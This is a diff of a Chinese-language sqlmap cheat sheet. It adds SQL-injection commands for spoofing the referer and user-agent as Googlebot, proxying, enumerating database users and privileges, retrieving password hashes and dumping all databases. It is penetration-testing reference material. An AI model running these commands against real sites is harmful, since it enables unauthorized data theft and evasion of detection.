@@ -16,30 +16,36 @@
 ## 常见操作
 **检测注入**
 ```bash
+sqlmap -u URL   # 判断注入
 sqlmap -u URL -p id # 指定参数注入
 sqlmap -u URL --cookie="xxxxx"  # 带 cookie 注入
 sqlmap -u URL --batch   # 不要请求用户输入，使用默认行为
 sqlmap -r aaa.txt   # post型注入
 
+sqlmap -u URL --os "Windows"    # 指定操作系统
 sqlmap -u URL -dbms mysql -level 3   # 指定数据库类型为 mysql，级别为 3（共 5 级，级别越高，检测越全面）
-
 sqlmap -u URL --dbms mysql --prefix "%df%27" --technique U -v 3   # 宽字节检测
+sqlmap -u URL --proxy "socks5://127.0.0.1:1080" # 代理注入测试
+sqlmap -u URL --referer "http://www.google.com" # 模拟来源
+sqlmap -u URL --user-agent "Googlebot/2.1(+http://www.googlebot.com/bot.html)"  # 模拟谷歌蜘蛛
 ```
 
 **获取信息**
 ```bash
-sqlmap -u URL   # 判断注入
 sqlmap -u URL --current-db  # 获取当前数据库
 sqlmap -u URL --dbs  # 枚举所有数据库
 sqlmap -u URL -f    # 检查 DBMS 版本
+sqlmap -u URL --is-dba  # 判断当前用户是否是 dba
+sqlmap -u URL --users   # 列出数据库管理系统用户
+sqlmap -u URL --privileges  # 枚举 DBMS 用户权限
+sqlmap -u URL --passwords   # 获取当前数据库密码
+
 
 sqlmap -u URL -D DATABASE --tables  # 获取数据库表
 sqlmap -u URL -D DATABASE -T TABLES --columns   # 获取指定表的列名
 sqlmap -u URL -D DATABASE -T TABLES -C COLUMNS --dump   # 获取指定表的列名
 sqlmap -u URL -dbms mysql -level 3 -D test -T admin -C "username,password" -dump    # dump 出字段 username 与 password 中的数据
-
-sqlmap -u URL --passwords   # 获取当前数据库密码
-sqlmap -u URL --privileges  # 枚举 DBMS 用户权限
+sqlmap -u URL --dump-all    # 列出所有数据库，所有表内容
 ```
 
 **搜索字段**
